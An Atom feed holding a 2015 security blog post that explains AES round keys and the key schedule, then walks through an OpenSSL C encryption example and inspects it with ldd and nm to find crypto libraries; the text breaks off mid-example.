<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Parsiya's Den]]></title>
  <link href="http://parsiya.net/atom.xml" rel="self"/>
  <link href="http://parsiya.net/"/>
  <updated>2015-01-07T01:56:24-05:00</updated>
  <id>http://parsiya.net/</id>
  <author>
    <name><![CDATA[Parsiya]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Tales From the Crypt(o) - Leaking AES Keys]]></title>
    <link href="http://parsiya.net/blog/2015-01-06-tales-from-the-crypt-o-leaking-aes-keys/"/>
    <updated>2015-01-06T23:36:48-05:00</updated>
    <id>http://parsiya.net/blog/tales-from-the-crypt-o-leaking-aes-keys</id>
    <content type="html"><![CDATA[<p>This post is part one of a two part internal blog entry on creating a Pintool for an assessment. Unfortunately I cannot talk about it, so I decided to put the first part out. If I find an opensource program similar to the assessment I will try and recreate the tool (but I am not holding my breath). As this part is essentially a build up, it may not be coherent at times. Alterntively, if you really want to read it, you can join us. We are almost always hiring (let me do the referal though ;).</p>

<p>Today we are going to talk about discovering encryption keys in sneaky ways. We will start with simple examples, do a bit of Digital Forensics or DF (for low standards of DF) and finally in part two we will use our recently acquired knowledge of Pintool to do <code>[redacted]</code>. </p>

<p>First let’s talk a bit about the inner-workings of AES decryption. By inner-workings of AES I do not mean the following diagrams that you have seen so many times.</p>

<!-- more -->

<p><span class="caption-wrapper"><img class="caption" src="http://parsiya.net/images/2015/tales1/CBC-Mode-Wikipedia.jpg" width="" height="" title="These are not the diagrams you are looking for - Source: Wikipedia" /><span class="caption-text">These are not the diagrams you are looking for - Source: Wikipedia</span></span></p>

<p>Instead I am going to talk about what happens inside those rectangles labeled “block cipher encryption/decryption.” If you don’t want to know about the AES stuff, jump directly to <a href="#aeskeysinaction">2. AES Keys in Action</a>.</p>

<h3 id="thinking-inside-the-box">1. Thinking Inside the Box</h3>
<p>Each of these boxes consist of a few rounds. The number of rounds is based on key size in AES. Keep in mind that AES is a subset of the <em>Rijndael</em> family of ciphers (and I still do not know how to pronounce the name). NIST (National Institute of Standards and Technology) selected a fixed block size (16 bytes) and three different key sizes (128, 192 and 256 bits) and called it AES (Advanced Encryption Standard) because that’s what NIST does (other than allegedly embedding backdoors in <a href="https://www.mail-archive.com/openssl-announce@openssl.org/msg00127.html">almost never used</a> random number generators, see <a href="http://blog.cryptographyengineering.com/2013/09/the-many-flaws-of-dualecdrbg.html">DUAL_EC_DRBG</a> ;)). You do not need to memorize the formula that calculates the number of rounds based on key and block size. You can see the result of my painstaking calculations in the following table:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center">Key Size (bits)</th>
      <th style="text-align: center">Number of Rounds (potatoes)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">128</td>
      <td style="text-align: center">10</td>
    </tr>
    <tr>
      <td style="text-align: center">192</td>
      <td style="text-align: center">12</td>
    </tr>
    <tr>
      <td style="text-align: center">256</td>
      <td style="text-align: center">14</td>
    </tr>
  </tbody>
</table>

<p>That was easy. So what happens inside each of these rounds. Except the last round, there are four steps in each round (encryption/decryption). For the remainder of this section I am going to assume that we are using a 128-bit key (16 bytes) resulting in 10 rounds.</p>

<p><span class="caption-wrapper"><img class="caption" src="http://parsiya.net/images/2015/tales1/AES-Rounds.jpg" width="" height="" title="Inside AES - Source: [http://www.iis.ee.ethz.ch/~kgf/acacia/fig/aes.png](http://www.iis.ee.ethz.ch/~kgf/acacia/fig/aes.png)" /><span class="caption-text">Inside AES - Source: <a href="http://www.iis.ee.ethz.ch/~kgf/acacia/fig/aes.png">http://www.iis.ee.ethz.ch/~kgf/acacia/fig/aes.png</a></span></span></p>

<p>There are four different operations but I am going to go into some detail about <code>AddRoundKey</code>. It is also the only operation which introduces an unknown element (key) into the process. The other operations are also simple and we can probably guess what they do based on their names.</p>

<h4 id="addroundkey">1.1 AddRoundKey</h4>
<p>It’s a simple XOR. A 16 byte round key is XOR-ed with the current block. If we count the number of AddRoundKey operations for Nr==10, we get 11. But we only have one 16 byte key and need 16<em>11 or 176 bytes. *“How am I going to create the extra 160 (176-16) bytes Senpai?”</em> one may ask. This is done through some magic known as <code>key expansion</code> which creates bytes out of thin air. It expands the original key into the 176 bytes also known as <code>key schedule</code>.</p>

<h5 id="aes-key-schedule-aka-rijndael-key-schedule">1.1.1 AES Key Schedule (aka Rijndael Key Schedule)</h5>
<p>The key expansion algorithm takes the original key and returns the key schedule. I could talk about the boring details of it but you are already bored and I am lazy. Search for Rijndael Key Schedule if you want to know more. Instead we are going to talk about some interesting stuff.</p>

<p>Don’t make the convenient mistake of thinking of the key schedule as a Pseudo-Random Number Generator (PRNG) where we enter the original key as the seed and then reap bytes. In a good PRNG, we should not be able to discover the seed by observing the output. In the Rijndael/AES key schedule there is direct correlation between the original key and each round key.</p>

<p>In AES-128, knowing a single round key (regardless of round number) is enough to generate the original key. In AES-256 we need to know two consecutive round keys and that is a good thing for AES-256. If not, the schedule had reduced the entropy of a 256-bit key to 128 bits. In a lot of hardware (a.k.a limited on-board memory), the first (actual encryption key) and last round keys (first two and last two round keys for AES-256) are stored for encryption/decryption and the rest are generated when needed from them.</p>

<p>Also by looking at the key schedule, we can see that the original AES key is copied directly to the start of the key schedule. In other words, the first 128 bits (16 bytes) of the AES-128 key schedule are the same as the original key.</p>

<h5 id="round-key-usage">1.1.2 Round Key Usage</h5>
<p>Great, so we have 16 bytes that are XOR-ed with something in each round. For decryption, we can create the key schedule and inverse it. This works because XOR is transitive (i.e. If ciphertext = plaintext XOR key then plaintext = ciphertext XOR key).</p>

<p>Notice the first AddRoundKey block in both encryption and decryption. In encryption this is first 16 bytes of the original key (or the whole key in case of AES-128). In decryption, this is the last round key. Keep this in mind, we are going to use it later.</p>

<h3 id="a-nameaeskeysinactiona-aes-keys-in-action">2. <a name="aeskeysinaction"></a> AES Keys in Action</h3>
<p>By now we know how AES keys are used. Let’s do some stuff. We’re going to use the same set up as last time. A Kali 32-bit VM running in VirtualBox.</p>

<h4 id="function-calls">2.1 Function Calls</h4>
<p>External function calls leak information. I am going to divide them into two parts <code>System Calls</code> (syscalls) and <code>Library Calls</code>. Basically these are functions that you can call and use in your program. If these functions part of the Operating System they are System Calls and if they are provided by a 3rd party library (shared library, DLL etc) they are Library Calls. For an excellent description of system calls, read the blog post by Gustavo Duartes named <a href="">System Calls Make the World Go Round</a> (also read the rest of his blog).</p>

<h5 id="openssl-example">2.1.1 OpenSSL Example</h5>
<p>Our example will be a simple Encryption/Decryption program in C using OpenSSL modified from [​http://wiki.openssl.org/index.php/EVP_Symmetric_Encryption_and_Decryption. It will encrypt and decrypt the string “The quick brown fox jumps over the lazy dog” with AES using the 256 bit (32 byte) key <code>ee12c03ceacdfb5d4c0e67c8f5ab3362</code> and IV <code>d36a4bf2e6dd9c68</code> (128 bits or 16 bytes). My comments start with <code>///</code>.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>AES-OpenSSL.cpp </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
<span class="line-number">42</span>
<span class="line-number">43</span>
<span class="line-number">44</span>
<span class="line-number">45</span>
<span class="line-number">46</span>
<span class="line-number">47</span>
<span class="line-number">48</span>
<span class="line-number">49</span>
<span class="line-number">50</span>
<span class="line-number">51</span>
<span class="line-number">52</span>
<span class="line-number">53</span>
<span class="line-number">54</span>
<span class="line-number">55</span>
<span class="line-number">56</span>
<span class="line-number">57</span>
<span class="line-number">58</span>
<span class="line-number">59</span>
<span class="line-number">60</span>
<span class="line-number">61</span>
<span class="line-number">62</span>
<span class="line-number">63</span>
<span class="line-number">64</span>
<span class="line-number">65</span>
<span class="line-number">66</span>
<span class="line-number">67</span>
<span class="line-number">68</span>
<span class="line-number">69</span>
<span class="line-number">70</span>
<span class="line-number">71</span>
<span class="line-number">72</span>
<span class="line-number">73</span>
<span class="line-number">74</span>
<span class="line-number">75</span>
<span class="line-number">76</span>
<span class="line-number">77</span>
<span class="line-number">78</span>
<span class="line-number">79</span>
<span class="line-number">80</span>
<span class="line-number">81</span>
<span class="line-number">82</span>
<span class="line-number">83</span>
<span class="line-number">84</span>
<span class="line-number">85</span>
<span class="line-number">86</span>
<span class="line-number">87</span>
<span class="line-number">88</span>
<span class="line-number">89</span>
<span class="line-number">90</span>
<span class="line-number">91</span>
<span class="line-number">92</span>
<span class="line-number">93</span>
<span class="line-number">94</span>
<span class="line-number">95</span>
<span class="line-number">96</span>
<span class="line-number">97</span>
<span class="line-number">98</span>
<span class="line-number">99</span>
<span class="line-number">100</span>
<span class="line-number">101</span>
<span class="line-number">102</span>
<span class="line-number">103</span>
<span class="line-number">104</span>
<span class="line-number">105</span>
<span class="line-number">106</span>
<span class="line-number">107</span>
<span class="line-number">108</span>
<span class="line-number">109</span>
<span class="line-number">110</span>
<span class="line-number">111</span>
<span class="line-number">112</span>
<span class="line-number">113</span>
<span class="line-number">114</span>
<span class="line-number">115</span>
<span class="line-number">116</span>
<span class="line-number">117</span>
<span class="line-number">118</span>
<span class="line-number">119</span>
<span class="line-number">120</span>
<span class="line-number">121</span>
<span class="line-number">122</span>
<span class="line-number">123</span>
<span class="line-number">124</span>
<span class="line-number">125</span>
<span class="line-number">126</span>
<span class="line-number">127</span>
<span class="line-number">128</span>
<span class="line-number">129</span>
<span class="line-number">130</span>
<span class="line-number">131</span>
<span class="line-number">132</span>
<span class="line-number">133</span>
<span class="line-number">134</span>
<span class="line-number">135</span>
<span class="line-number">136</span>
<span class="line-number">137</span>
<span class="line-number">138</span>
<span class="line-number">139</span>
<span class="line-number">140</span>
<span class="line-number">141</span>
<span class="line-number">142</span>
<span class="line-number">143</span>
<span class="line-number">144</span>
<span class="line-number">145</span>
</pre></td><td class="code"><pre><code class="cpp"><span class="line"><span class="cp">#include &lt;openssl/conf.h&gt;</span>
</span><span class="line"><span class="cp">#include &lt;openssl/evp.h&gt;</span>
</span><span class="line"><span class="cp">#include &lt;openssl/err.h&gt;</span>
</span><span class="line"><span class="cp">#include &lt;string.h&gt;</span>
</span><span class="line">
</span><span class="line"><span class="c1">/// Code from OpenSSL Wiki at http://wiki.openssl.org/index.php/EVP_Symmetric_Encryption_and_Decryption</span>
</span><span class="line"><span class="c1">/// Needs libssl-dev (e.g. sudo apt-get install libssl-dev )</span>
</span><span class="line"><span class="c1">/// Compile with gcc [filename].c -o [outputfile] -lcrypto -ggdb</span>
</span><span class="line">
</span><span class="line"><span class="kt">void</span> <span class="n">handleErrors</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class="line"><span class="p">{</span>
</span><span class="line">  <span class="n">ERR_print_errors_fp</span><span class="p">(</span><span class="n">stderr</span><span class="p">);</span>
</span><span class="line">  <span class="n">abort</span><span class="p">();</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="kt">int</span> <span class="n">encrypt</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">plaintext</span><span class="p">,</span> <span class="kt">int</span> <span class="n">plaintext_len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span>
</span><span class="line">  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">iv</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ciphertext</span><span class="p">)</span>
</span><span class="line"><span class="p">{</span>
</span><span class="line">  <span class="n">EVP_CIPHER_CTX</span> <span class="o">*</span><span class="n">ctx</span><span class="p">;</span>
</span><span class="line">  <span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
</span><span class="line">  <span class="kt">int</span> <span class="n">ciphertext_len</span><span class="p">;</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* Create and initialise the context */</span>
</span><span class="line">  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">ctx</span> <span class="o">=</span> <span class="n">EVP_CIPHER_CTX_new</span><span class="p">()))</span> <span class="n">handleErrors</span><span class="p">();</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* Initialise the encryption operation. IMPORTANT - ensure you use a key</span>
</span><span class="line"><span class="cm">   * and IV size appropriate for your cipher</span>
</span><span class="line"><span class="cm">   * In this example we are using 256 bit AES (i.e. a 256 bit key). The</span>
</span><span class="line"><span class="cm">   * IV size for *most* modes is the same as the block size. For AES this</span>
</span><span class="line"><span class="cm">   * is 128 bits */</span>
</span><span class="line">  <span class="k">if</span><span class="p">(</span><span class="mi">1</span> <span class="o">!=</span> <span class="n">EVP_EncryptInit_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">EVP_aes_256_cbc</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">))</span>  <span class="n">handleErrors</span><span class="p">();</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* Provide the message to be encrypted, and obtain the encrypted output.</span>
</span><span class="line"><span class="cm">   * EVP_EncryptUpdate can be called multiple times if necessary</span>
</span><span class="line"><span class="cm">   */</span>
</span><span class="line">  <span class="k">if</span><span class="p">(</span><span class="mi">1</span> <span class="o">!=</span> <span class="n">EVP_EncryptUpdate</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">,</span> <span class="n">plaintext</span><span class="p">,</span> <span class="n">plaintext_len</span><span class="p">))</span> <span class="n">handleErrors</span><span class="p">();</span>
</span><span class="line">  <span class="n">ciphertext_len</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* Finalise the encryption. Further ciphertext bytes may be written at</span>
</span><span class="line"><span class="cm">   * this stage.</span>
</span><span class="line"><span class="cm">   */</span>
</span><span class="line">  <span class="k">if</span><span class="p">(</span><span class="mi">1</span> <span class="o">!=</span> <span class="n">EVP_EncryptFinal_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">ciphertext</span> <span class="o">+</span> <span class="n">len</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">))</span> <span class="n">handleErrors</span><span class="p">();</span>
</span><span class="line">  <span class="n">ciphertext_len</span> <span class="o">+=</span> <span class="n">len</span><span class="p">;</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* Clean up */</span>
</span><span class="line">  <span class="n">EVP_CIPHER_CTX_free</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
</span><span class="line">
</span><span class="line">  <span class="k">return</span> <span class="n">ciphertext_len</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="kt">int</span> <span class="n">decrypt</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ciphertext</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ciphertext_len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span>
</span><span class="line">  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">iv</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">plaintext</span><span class="p">)</span>
</span><span class="line"><span class="p">{</span>
</span><span class="line">  <span class="n">EVP_CIPHER_CTX</span> <span class="o">*</span><span class="n">ctx</span><span class="p">;</span>
</span><span class="line">  <span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
</span><span class="line">  <span class="kt">int</span> <span class="n">plaintext_len</span><span class="p">;</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* Create and initialise the context */</span>
</span><span class="line">  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">ctx</span> <span class="o">=</span> <span class="n">EVP_CIPHER_CTX_new</span><span class="p">()))</span> <span class="n">handleErrors</span><span class="p">();</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* Initialise the decryption operation. IMPORTANT - ensure you use a key</span>
</span><span class="line"><span class="cm">   * and IV size appropriate for your cipher</span>
</span><span class="line"><span class="cm">   * In this example we are using 256 bit AES (i.e. a 256 bit key). The</span>
</span><span class="line"><span class="cm">   * IV size for *most* modes is the same as the block size. For AES this</span>
</span><span class="line"><span class="cm">   * is 128 bits */</span>
</span><span class="line">  <span class="k">if</span><span class="p">(</span><span class="mi">1</span> <span class="o">!=</span> <span class="n">EVP_DecryptInit_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">EVP_aes_256_cbc</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">))</span>  <span class="n">handleErrors</span><span class="p">();</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* Provide the message to be decrypted, and obtain the plaintext output.</span>
</span><span class="line"><span class="cm">   * EVP_DecryptUpdate can be called multiple times if necessary</span>
</span><span class="line"><span class="cm">   */</span>
</span><span class="line">  <span class="k">if</span><span class="p">(</span><span class="mi">1</span> <span class="o">!=</span> <span class="n">EVP_DecryptUpdate</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">plaintext</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">,</span> <span class="n">ciphertext_len</span><span class="p">))</span>  <span class="n">handleErrors</span><span class="p">();</span>
</span><span class="line">  <span class="n">plaintext_len</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* Finalise the decryption. Further plaintext bytes may be written at</span>
</span><span class="line"><span class="cm">   * this stage.</span>
</span><span class="line"><span class="cm">   */</span>
</span><span class="line">
</span><span class="line">  <span class="k">if</span><span class="p">(</span><span class="mi">1</span> <span class="o">!=</span> <span class="n">EVP_DecryptFinal_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">plaintext</span> <span class="o">+</span> <span class="n">len</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">))</span> <span class="n">handleErrors</span><span class="p">();</span>
</span><span class="line">  <span class="n">plaintext_len</span> <span class="o">+=</span> <span class="n">len</span><span class="p">;</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* Clean up */</span>
</span><span class="line">  <span class="n">EVP_CIPHER_CTX_free</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
</span><span class="line">
</span><span class="line">  <span class="k">return</span> <span class="n">plaintext_len</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">arc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
</span><span class="line"><span class="p">{</span>
</span><span class="line">  <span class="cm">/* Set up the key and iv. Do I need to say to not hard code these in a</span>
</span><span class="line"><span class="cm">   * real application? :-)</span>
</span><span class="line"><span class="cm">   */</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* A 256 bit key */</span>
</span><span class="line">  <span class="c1">/// unsigned char *key = &quot;01234567890123456789012345678901&quot;;</span>
</span><span class="line">
</span><span class="line">  <span class="c1">/// this is still a 256-bit (32 byte) key, each character is treated as one byte</span>
</span><span class="line">  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span> <span class="o">=</span> <span class="s">&quot;ee12c03ceacdfb5d4c0e67c8f5ab3362&quot;</span><span class="p">;</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* A 128 bit IV */</span>
</span><span class="line">  <span class="c1">/// unsigned char *iv = &quot;01234567890123456&quot;;</span>
</span><span class="line">  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">iv</span> <span class="o">=</span> <span class="s">&quot;d36a4bf2e6dd9c68&quot;</span><span class="p">;</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* Message to be encrypted */</span>
</span><span class="line">  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">plaintext</span> <span class="o">=</span>
</span><span class="line">    <span class="s">&quot;The quick brown fox jumps over the lazy dog&quot;</span><span class="p">;</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* Buffer for ciphertext. Ensure the buffer is long enough for the</span>
</span><span class="line"><span class="cm">   * ciphertext which may be longer than the plaintext, dependant on the</span>
</span><span class="line"><span class="cm">   * algorithm and mode</span>
</span><span class="line"><span class="cm">   */</span>
</span><span class="line">  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">ciphertext</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* Buffer for the decrypted text */</span>
</span><span class="line">  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">decryptedtext</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class="line">
</span><span class="line">  <span class="kt">int</span> <span class="n">decryptedtext_len</span><span class="p">,</span> <span class="n">ciphertext_len</span><span class="p">;</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* Initialise the library */</span>
</span><span class="line">  <span class="n">ERR_load_crypto_strings</span><span class="p">();</span>
</span><span class="line">  <span class="n">OpenSSL_add_all_algorithms</span><span class="p">();</span>
</span><span class="line">  <span class="n">OPENSSL_config</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* Encrypt the plaintext */</span>
</span><span class="line">  <span class="n">ciphertext_len</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">plaintext</span><span class="p">),</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">);</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* Do something useful with the ciphertext here */</span>
</span><span class="line">  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Ciphertext is:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class="line">  <span class="n">BIO_dump_fp</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">,</span> <span class="n">ciphertext_len</span><span class="p">);</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* Decrypt the ciphertext */</span>
</span><span class="line">  <span class="n">decryptedtext_len</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">ciphertext_len</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">decryptedtext</span><span class="p">);</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* Add a NULL terminator. We are expecting printable text */</span>
</span><span class="line">  <span class="n">decryptedtext</span><span class="p">[</span><span class="n">decryptedtext_len</span><span class="p">]</span> <span class="o">=</span> <span class="err">&#39;&#39;</span><span class="p">;</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* Show the decrypted text */</span>
</span><span class="line">  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Decrypted text is:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class="line">  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">decryptedtext</span><span class="p">);</span>
</span><span class="line">
</span><span class="line">  <span class="cm">/* Clean up */</span>
</span><span class="line">  <span class="n">EVP_cleanup</span><span class="p">();</span>
</span><span class="line">  <span class="n">ERR_free_strings</span><span class="p">();</span>
</span><span class="line">
</span><span class="line">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>we need the <code>libssl-dev</code> library which can be installed by <code>sudo apt-get install libssl-dev</code>. To compile use <code>gcc [filename].c -o [outputfile] -lcrypto -ggdb</code>. We will use the debug information in GDB later. Here is the output:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>output </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>gcc AES-OpenSSL.c -ggdb -lcrypto -o sampleaes
</span><span class="line"><span class="nv">$ </span>./sampleaes
</span><span class="line">Ciphertext is:
</span><span class="line">0000 - 51 34 3f 21 87 5d 4e f6-18 1d c6 6d 41 c1 12 ae   Q4?!.<span class="o">]</span>N....mA...
</span><span class="line">0010 - e0 a7 de a0 fa b9 6c b0-91 5e 21 c6 d3 90 96 36   ......l..^!....6
</span><span class="line">0020 - 70 7b ec 69 89 e1 bc 0a-2c 61 f4 c6 26 61 5f 2e   p<span class="o">{</span>.i....,a..&amp;a_.
</span><span class="line">Decrypted text is:
</span><span class="line">The quick brown fox jumps over the lazy dog
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h4 id="monitoring-library-calls">2.2 Monitoring Library Calls</h4>
<p>To monitor these calls, we have a few tools at hand. On *nix operating systems we can use strace (for system calls) and ltrace (for both syscalls and library calls). On Windows we can use <a href="http://www.rohitab.com/apimonitor">API Monitor</a> as I have used in the <a href="http://parsiya.net/blog/2014-10-07-my-adventure-with-fireeye-flare-challenge/#ch7">past</a>. If you have a Mac you can try your luck with <a href="https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man1/dtruss.1m.html">dtruss</a> which uses dtrace. I am not quite sure if it can be used to trace library calls and if it works on iOS.</p>

<h5 id="discovering-shared-libraries">2.2.1 Discovering Shared Libraries</h5>
<p>Assuming we are approaching this application from a black-box perspective, we need to discover the shared libraries first. This can be done in different ways. We will talk about <code>ldd</code>, <code>nm</code>, <code>strings</code> or just <code>ltrace</code>. Just using ltrace may do the job but if there are a lot of library calls, we need to spot critical/interesting libraries to filter out the noise.</p>

<h6 id="ldd">2.2.1.1 ldd</h6>
<p><code>ldd</code> “prints shared library dependencies” according to the <a href="http://man7.org/linux/man-pages/man1/ldd.1.html">man</a> page. Let’s run it.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>running ldd </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ldd</span> sampleaes
</span><span class="line">  linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb77b8000<span class="o">)</span>
</span><span class="line">  libcrypto.so.1.0.0 <span class="o">=</span>&gt; /usr/lib/i386-linux-gnu/i686/cmov/libcrypto.so.1.0.0 <span class="o">(</span>0xb75df000<span class="o">)</span>
</span><span class="line">  libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 <span class="o">(</span>0xb747b000<span class="o">)</span>
</span><span class="line">  libdl.so.2 <span class="o">=</span>&gt; /lib/i386-linux-gnu/i686/cmov/libdl.so.2 <span class="o">(</span>0xb7476000<span class="o">)</span>
</span><span class="line">  libz.so.1 <span class="o">=</span>&gt; /lib/i386-linux-gnu/libz.so.1 <span class="o">(</span>0xb745d000<span class="o">)</span>
</span><span class="line">  /lib/ld-linux.so.2 <span class="o">(</span>0xb77b9000<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>In line 3 we can see <a href="http://wiki.openssl.org/index.php/Libcrypto_API">libcrypto</a> which means the application is using OpenSSL (the other OpenSSL library is <code>libssl</code>).</p>

<h6 id="nm">2.2.1.2 nm</h6>
<p><code>nm</code> “<a href="http://unixhelp.ed.ac.uk/CGI/man-cgi?nm">lists symbols from object files.</a>” It’s a good idea to look at its output and look for familiar symbols. We can clearly see OPENSSL and function names in the truncated output.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>running nm </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
